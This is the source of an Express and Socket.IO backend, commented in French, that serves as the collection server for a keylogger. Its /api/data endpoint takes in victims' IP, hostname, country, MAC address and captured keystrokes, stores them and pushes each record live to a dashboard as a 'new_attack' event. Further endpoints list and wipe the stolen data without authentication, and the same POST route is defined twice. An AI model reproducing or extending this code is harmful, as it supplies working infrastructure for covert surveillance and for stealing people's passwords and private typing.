const express = require("express");
const cors = require("cors");
const fs = require("fs");
const http = require("http");
const path = require("path");
const { Server } = require("socket.io");
const bcrypt = require("bcrypt");
const rateLimit = require("express-rate-limit");

const app = express();
const PORT = 3001;
const filePath = path.join(__dirname, "secure_data", "data.json");
const usersPath = path.join(__dirname, "secure_data", "users.json");

const logsDir = path.join(__dirname, "logs");
if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir);

app.use(cors());
app.use(express.json());

// 🌐 Limiteur anti-bruteforce
const loginLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 5, // 5 tentatives max
  message: { message: "Trop de tentatives, réessayez plus tard." }
});

// 📝 Logger
function logRequest(req) {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const log = `[${new Date().toISOString()}] ${req.method} ${req.url} - IP: ${ip} - UA: ${req.headers["user-agent"]}\n`;
  fs.appendFileSync(path.join(logsDir, "server.log"), log);
}

// HTTP + WebSocket
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "http://localhost:3000", methods: ["GET", "POST"] }
});

// 🔐 Login via JSON hashé
app.post("/api/login", loginLimiter, async (req, res) => {
  const { username, password } = req.body;

  if (!fs.existsSync(usersPath)) {
    return res.status(500).json({ message: "Fichier utilisateurs manquant." });
  }

  try {
    const users = JSON.parse(fs.readFileSync(usersPath));
    const user = users.find(u => u.username === username);

    if (!user) {
      return res.status(401).json({ message: "Nom d'utilisateur incorrect" });
    }

    const valid = await bcrypt.compare(password, user.password);
    if (!valid) {
      return res.status(401).json({ message: "Mot de passe incorrect" });
    }

    return res.status(200).json({ message: "Connexion réussie" });
  } catch (err) {
    console.error("Erreur login :", err);
    res.status(500).json({ message: "Erreur serveur" });
  }
});


// WebSocket : suivi clients connectés
let connectedClients = 0;

io.on("connection", (socket) => {
  connectedClients++;
  console.log("✅ Client WebSocket connecté :", connectedClients);
  io.emit("update_clients", connectedClients);

  socket.on("disconnect", () => {
    connectedClients--;
    console.log("❌ Client déconnecté :", connectedClients);
    io.emit("update_clients", connectedClients);
  });
});

// 📤 Lecture JSON
app.get("/api/data", (req, res) => {
  logRequest(req);
  if (!fs.existsSync(filePath)) return res.json([]);

  try {
    const raw = fs.readFileSync(filePath);
    const parsed = JSON.parse(raw);
    res.json(Array.isArray(parsed) ? parsed : []);
  } catch (err) {
    console.error("Erreur lecture fichier JSON :", err);
    res.status(500).json({ message: "Erreur lecture fichier JSON" });
  }
});

app.post("/api/data", (req, res) => {
  logRequest(req);
  const { ip, hostname, country, mac, timestamp, keystrokes } = req.body;

  if (!ip || !hostname || !country || !mac || !timestamp || !Array.isArray(keystrokes)) {
    return res.status(400).json({ message: "Champs manquants ou invalides." });
  }

  const newData = { ip, hostname, country, mac, timestamp, keystrokes };

  let existing = [];
  if (fs.existsSync(filePath)) {
    try {
      const raw = fs.readFileSync(filePath);
      existing = JSON.parse(raw);
      if (!Array.isArray(existing)) existing = [];
    } catch {
      existing = [];
    }
  }

  existing.push(newData);
  fs.writeFileSync(filePath, JSON.stringify(existing, null, 2));
  io.emit("new_attack", newData);
  res.status(200).json({ message: "Donnée enregistrée" });
});


// ➕ Ajout
// ➕ Ajout (une ou plusieurs victimes)
app.post("/api/data", (req, res) => {
  logRequest(req);
  const incoming = req.body;

  let existing = [];
  if (fs.existsSync(filePath)) {
    try {
      const raw = fs.readFileSync(filePath);
      existing = JSON.parse(raw);
      if (!Array.isArray(existing)) existing = [];
    } catch {
      existing = [];
    }
  }

  // Permet un ou plusieurs objets
  if (Array.isArray(incoming)) {
    existing.push(...incoming);
  } else {
    existing.push(incoming);
  }

  fs.writeFileSync(filePath, JSON.stringify(existing, null, 2));

  // Émet par WebSocket chaque victime ajoutée
  (Array.isArray(incoming) ? incoming : [incoming]).forEach(v => io.emit("new_attack", v));

  res.status(200).json({ message: "Données enregistrées" });
});


// ♻️ Reset
app.post("/api/reset", (req, res) => {
  logRequest(req);
  fs.writeFileSync(filePath, JSON.stringify([]));
  res.status(200).json({ message: "Réinitialisé." });
});

// ▶️ Lancement serveur
server.listen(PORT, () => {
  console.log(`✅ Backend prêt sur http://localhost:${PORT}`);
});
